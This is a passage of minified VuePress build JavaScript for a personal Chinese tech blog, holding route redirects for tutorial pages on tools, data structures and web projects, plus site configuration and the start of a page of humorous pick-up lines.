%E5%85%B7/VSCode%E7%9A%84%E4%BD%BF%E7%94%A8.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-4187e536").then(t)}},{path:"/book-web/常用工具/VSCode的使用.html",redirect:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/VSCode%E7%9A%84%E4%BD%BF%E7%94%A8.html"},{path:"/book-web/常用工具/VSCode的使用.html",redirect:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/VSCode%E7%9A%84%E4%BD%BF%E7%94%A8.html"},{name:"v-0e9188c2",path:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/webpack%E7%9A%84%E4%BD%BF%E7%94%A8.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-0e9188c2").then(t)}},{path:"/book-web/常用工具/webpack的使用.html",redirect:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/webpack%E7%9A%84%E4%BD%BF%E7%94%A8.html"},{path:"/book-web/常用工具/webpack的使用.html",redirect:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/webpack%E7%9A%84%E4%BD%BF%E7%94%A8.html"},{name:"v-daa52cfc",path:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8docsify%E5%86%99blog.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-daa52cfc").then(t)}},{path:"/book-web/常用工具/使用docsify写blog.html",redirect:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8docsify%E5%86%99blog.html"},{path:"/book-web/常用工具/使用docsify写blog.html",redirect:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8docsify%E5%86%99blog.html"},{name:"v-ed5b9394",path:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8gitbook%E5%86%99blog.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-ed5b9394").then(t)}},{path:"/book-web/常用工具/使用gitbook写blog.html",redirect:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8gitbook%E5%86%99blog.html"},{path:"/book-web/常用工具/使用gitbook写blog.html",redirect:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8gitbook%E5%86%99blog.html"},{name:"v-68cece76",path:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8vuepress%E5%86%99blog.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-68cece76").then(t)}},{path:"/book-web/常用工具/使用vuepress写blog.html",redirect:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8vuepress%E5%86%99blog.html"},{path:"/book-web/常用工具/使用vuepress写blog.html",redirect:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8vuepress%E5%86%99blog.html"},{name:"v-df549c9e",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-df549c9e").then(t)}},{path:"/book-web/数据结构与算法/1.环境搭建.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"},{path:"/book-web/数据结构与算法/1.环境搭建.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"},{name:"v-4b430b61",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/10.%E5%9B%BE.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-4b430b61").then(t)}},{path:"/book-web/数据结构与算法/10.图.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/10.%E5%9B%BE.html"},{path:"/book-web/数据结构与算法/10.图.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/10.%E5%9B%BE.html"},{name:"v-3850d23a",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/11.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-3850d23a").then(t)}},{path:"/book-web/数据结构与算法/11.排序和搜索算法.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/11.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95.html"},{path:"/book-web/数据结构与算法/11.排序和搜索算法.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/11.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95.html"},{name:"v-2020ddf2",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/12.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E6%8A%80%E5%B7%A7.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-2020ddf2").then(t)}},{path:"/book-web/数据结构与算法/12.算法设计与技巧.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/12.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E6%8A%80%E5%B7%A7.html"},{path:"/book-web/数据结构与算法/12.算法设计与技巧.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/12.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E6%8A%80%E5%B7%A7.html"},{name:"v-72208521",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/13.%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-72208521").then(t)}},{path:"/book-web/数据结构与算法/13.算法复杂度.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/13.%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6.html"},{path:"/book-web/数据结构与算法/13.算法复杂度.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/13.%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6.html"},{name:"v-55500e3a",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/2.%E6%A0%88.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-55500e3a").then(t)}},{path:"/book-web/数据结构与算法/2.栈.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/2.%E6%A0%88.html"},{path:"/book-web/数据结构与算法/2.栈.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/2.%E6%A0%88.html"},{name:"v-add73d44",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/3.%E9%98%9F%E5%88%97.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-add73d44").then(t)}},{path:"/book-web/数据结构与算法/3.队列.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/3.%E9%98%9F%E5%88%97.html"},{path:"/book-web/数据结构与算法/3.队列.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/3.%E9%98%9F%E5%88%97.html"},{name:"v-5c3f25c2",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/4.%E9%93%BE%E8%A1%A8.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-5c3f25c2").then(t)}},{path:"/book-web/数据结构与算法/4.链表.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/4.%E9%93%BE%E8%A1%A8.html"},{path:"/book-web/数据结构与算法/4.链表.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/4.%E9%93%BE%E8%A1%A8.html"},{name:"v-93e993f8",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/5.%E9%9B%86%E5%90%88.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-93e993f8").then(t)}},{path:"/book-web/数据结构与算法/5.集合.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/5.%E9%9B%86%E5%90%88.html"},{path:"/book-web/数据结构与算法/5.集合.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/5.%E9%9B%86%E5%90%88.html"},{name:"v-1d3d450c",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/6.%E5%AD%97%E5%85%B8%E5%92%8C%E6%95%A3%E5%88%97%E8%A1%A8.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-1d3d450c").then(t)}},{path:"/book-web/数据结构与算法/6.字典和散列表.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/6.%E5%AD%97%E5%85%B8%E5%92%8C%E6%95%A3%E5%88%97%E8%A1%A8.html"},{path:"/book-web/数据结构与算法/6.字典和散列表.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/6.%E5%AD%97%E5%85%B8%E5%92%8C%E6%95%A3%E5%88%97%E8%A1%A8.html"},{name:"v-22e1c1e0",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/7.%E9%80%92%E5%BD%92.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-22e1c1e0").then(t)}},{path:"/book-web/数据结构与算法/7.递归.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/7.%E9%80%92%E5%BD%92.html"},{path:"/book-web/数据结构与算法/7.递归.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/7.%E9%80%92%E5%BD%92.html"},{name:"v-4ef80a54",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/8.%E6%A0%91.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-4ef80a54").then(t)}},{path:"/book-web/数据结构与算法/8.树.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/8.%E6%A0%91.html"},{path:"/book-web/数据结构与算法/8.树.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/8.%E6%A0%91.html"},{name:"v-16e944a9",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/9.%E4%BA%8C%E5%8F%89%E5%A0%86%E5%92%8C%E5%A0%86%E6%8E%92%E5%BA%8F.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-16e944a9").then(t)}},{path:"/book-web/数据结构与算法/9.二叉堆和堆排序.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/9.%E4%BA%8C%E5%8F%89%E5%A0%86%E5%92%8C%E5%A0%86%E6%8E%92%E5%BA%8F.html"},{path:"/book-web/数据结构与算法/9.二叉堆和堆排序.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/9.%E4%BA%8C%E5%8F%89%E5%A0%86%E5%92%8C%E5%A0%86%E6%8E%92%E5%BA%8F.html"},{name:"v-fdc5ab4e",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-fdc5ab4e").then(t)}},{path:"/book-web/数据结构与算法/",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/index.html",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{path:"/book-web/数据结构与算法/",redirect:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{name:"v-25bb4771",path:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-25bb4771").then(t)}},{path:"/book-web/画板项目/技术方案/",redirect:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/"},{path:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/index.html",redirect:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/"},{path:"/book-web/画板项目/技术方案/",redirect:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/"},{name:"v-4b6c4615",path:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-4b6c4615").then(t)}},{path:"/book-web/画板项目/技术方案/整体架构设计.html",redirect:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1.html"},{path:"/book-web/画板项目/技术方案/整体架构设计.html",redirect:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1.html"},{name:"v-6d2971ec",path:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BC%80%E5%8F%91/1.%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E5%92%8C%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-6d2971ec").then(t)}},{path:"/book-web/画板项目/脚手架开发/1.框架搭建和架构设计.html",redirect:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BC%80%E5%8F%91/1.%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E5%92%8C%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1.html"},{path:"/book-web/画板项目/脚手架开发/1.框架搭建和架构设计.html",redirect:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BC%80%E5%8F%91/1.%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E5%92%8C%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1.html"},{name:"v-2ac88107",path:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BC%80%E5%8F%91/",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-2ac88107").then(t)}},{path:"/book-web/画板项目/脚手架开发/",redirect:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BC%80%E5%8F%91/"},{path:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BC%80%E5%8F%91/index.html",redirect:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BC%80%E5%8F%91/"},{path:"/book-web/画板项目/脚手架开发/",redirect:"/book-web/%E7%94%BB%E6%9D%BF%E9%A1%B9%E7%9B%AE/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BC%80%E5%8F%91/"},{name:"v-0f8b7cba",path:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/1.%E7%94%A8ts%E7%BC%96%E5%86%99%E5%B0%8F%E7%88%AC%E8%99%AB.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-0f8b7cba").then(t)}},{path:"/book-web/项目/react+express+ts写爬虫/1.用ts编写小爬虫.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/1.%E7%94%A8ts%E7%BC%96%E5%86%99%E5%B0%8F%E7%88%AC%E8%99%AB.html"},{path:"/book-web/项目/react+express+ts写爬虫/1.用ts编写小爬虫.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/1.%E7%94%A8ts%E7%BC%96%E5%86%99%E5%B0%8F%E7%88%AC%E8%99%AB.html"},{name:"v-44238a46",path:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/2.%E7%94%A8express%E5%AE%9E%E7%8E%B0%E7%88%AC%E8%99%AB%E6%8E%A5%E5%8F%A3.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-44238a46").then(t)}},{path:"/book-web/项目/react+express+ts写爬虫/2.用express实现爬虫接口.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/2.%E7%94%A8express%E5%AE%9E%E7%8E%B0%E7%88%AC%E8%99%AB%E6%8E%A5%E5%8F%A3.html"},{path:"/book-web/项目/react+express+ts写爬虫/2.用express实现爬虫接口.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/2.%E7%94%A8express%E5%AE%9E%E7%8E%B0%E7%88%AC%E8%99%AB%E6%8E%A5%E5%8F%A3.html"},{name:"v-6bda811e",path:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/3.%E7%94%A8react%E5%B1%95%E7%A4%BA%E7%88%AC%E8%99%AB%E6%95%B0%E6%8D%AE.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-6bda811e").then(t)}},{path:"/book-web/项目/react+express+ts写爬虫/3.用react展示爬虫数据.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/3.%E7%94%A8react%E5%B1%95%E7%A4%BA%E7%88%AC%E8%99%AB%E6%95%B0%E6%8D%AE.html"},{path:"/book-web/项目/react+express+ts写爬虫/3.用react展示爬虫数据.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/3.%E7%94%A8react%E5%B1%95%E7%A4%BA%E7%88%AC%E8%99%AB%E6%95%B0%E6%8D%AE.html"},{name:"v-7ed37872",path:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-7ed37872").then(t)}},{path:"/book-web/项目/react+express+ts写爬虫/",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/"},{path:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/index.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/"},{path:"/book-web/项目/react+express+ts写爬虫/",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/"},{name:"v-07dfe18d",path:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-07dfe18d").then(t)}},{path:"/book-web/项目/用vue+node开发博客项目/1.环境搭建.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"},{path:"/book-web/项目/用vue+node开发博客项目/1.环境搭建.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"},{name:"v-040fd3b4",path:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/2.%E5%BC%80%E5%8F%91%E6%8E%A5%E5%8F%A3.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-040fd3b4").then(t)}},{path:"/book-web/项目/用vue+node开发博客项目/2.开发接口.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/2.%E5%BC%80%E5%8F%91%E6%8E%A5%E5%8F%A3.html"},{path:"/book-web/项目/用vue+node开发博客项目/2.开发接口.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/2.%E5%BC%80%E5%8F%91%E6%8E%A5%E5%8F%A3.html"},{name:"v-59315497",path:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/3.%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-59315497").then(t)}},{path:"/book-web/项目/用vue+node开发博客项目/3.使用数据库.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/3.%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93.html"},{path:"/book-web/项目/用vue+node开发博客项目/3.使用数据库.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/3.%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93.html"},{name:"v-ecfff446",path:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-ecfff446").then(t)}},{path:"/book-web/项目/用vue+node开发博客项目/",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/"},{path:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/index.html",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/"},{path:"/book-web/项目/用vue+node开发博客项目/",redirect:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/"},{path:"*",component:gi}],xi={title:"Liawn's blog",description:"用vuepress搭建的个人博客",base:"/blog-vuepress/",headTags:[["meta",{charset:"UTF-8"}],["link",{rel:"icon",href:"/blog-vuepress/favicon.ico"}]],pages:[{title:"Home",frontmatter:{home:!0,heroImage:"/logo.png",heroText:"Liawn's blog",tagline:"Love is all we need.",actionText:"进入 →",actionLink:"/book-web/",footer:"MIT Licensed | Copyright © 2021-present LiawnLiu"},regularPath:"/",relativePath:"README.md",key:"v-4c947606",path:"/",lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:null,content:"",normalizedContent:"",charsets:{}},{title:"土味情话",frontmatter:{},regularPath:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E5%9C%9F%E5%91%B3%E6%83%85%E8%AF%9D.html",relativePath:"book-sketches/日常生活/土味情话.md",key:"v-239fd83a",path:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E5%9C%9F%E5%91%B3%E6%83%85%E8%AF%9D.html",lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:null,content:"# 土味情话\n\n表白             恋爱吗\n你知道什么酒最容易醉么？   你想养狗吗？\n和你的天长地久        我这种单身狗\n你知道我的缺点是什么吗？   今天喝了脉动，还吃了果冻\n我缺点你           可是还是忍不住对你心动\nA-Z你选择几？       我现在一动都不敢动\n我选择U           怕我移动就深陷爱你的沼泽\n我缺了一样生活必需品！    你会游泳吗？\n你呀！            我们马上就要坠入爱河了\n我对女朋友的标准只有一个   有钱的人、聪明的人、漂亮的人，你想成为哪种人？\n必须是你           我想成为你的人\n你知道你哪里好吗？      我觉得我们的友情都此为止了\n做我的女朋友刚刚好      因为接下来我们只能谈爱情了\n可以教我包饺子吗？      我想买一块地\n我容易露馅，喜欢你也是    你的死心塌地\n买西瓜吗？买一送一哦     告诉你个坏消息\n送你我这样的小傻瓜      我对你思想不单纯了\n我帮你看个手相        你手机有导航吗？我想去一个地方\n你命里好像缺个什么，缺我   你心里\n你知道我是什么星座的吗？   \n我什么都可以为你做\n\n想你了               心里有你\n我一点也不想你！          你怎么这么霸道呀\n两点突然想了            因为你霸占了我整颗心\n我今天头疼了整整一天 